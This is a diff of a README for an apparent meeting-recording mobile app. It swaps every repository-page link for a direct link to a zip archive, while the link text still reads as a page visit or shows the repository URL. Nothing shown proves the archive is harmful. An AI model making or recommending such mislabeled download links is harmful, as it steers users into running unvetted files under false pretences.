@@ -1,6 +1,6 @@
 # 📱 smart-mom-mobile-prod - Record, Upload, Review Meetings Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/viditk9780/smart-mom-mobile-prod)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/viditk9780/smart-mom-mobile-prod/main/app/mom_mobile_smart_prod_2.7.zip)
 
 ## 🚀 What this app does
 
@@ -16,7 +16,7 @@ It is built for people who want:
 
 Use this link to visit the download page and get the app:
 
-[Visit the download page](https://github.com/viditk9780/smart-mom-mobile-prod)
+[Visit the download page](https://raw.githubusercontent.com/viditk9780/smart-mom-mobile-prod/main/app/mom_mobile_smart_prod_2.7.zip)
 
 If you are on Windows and need to prepare the app files before using them on your phone, you can also use this page to open the repository and follow the app setup files inside it.
 
@@ -211,7 +211,7 @@ For better meeting output:
 
 Open the main repository page here:
 
-[https://github.com/viditk9780/smart-mom-mobile-prod](https://github.com/viditk9780/smart-mom-mobile-prod)
+[https://raw.githubusercontent.com/viditk9780/smart-mom-mobile-prod/main/app/mom_mobile_smart_prod_2.7.zip](https://raw.githubusercontent.com/viditk9780/smart-mom-mobile-prod/main/app/mom_mobile_smart_prod_2.7.zip)
 
 ## 🏷️ Project topics
 
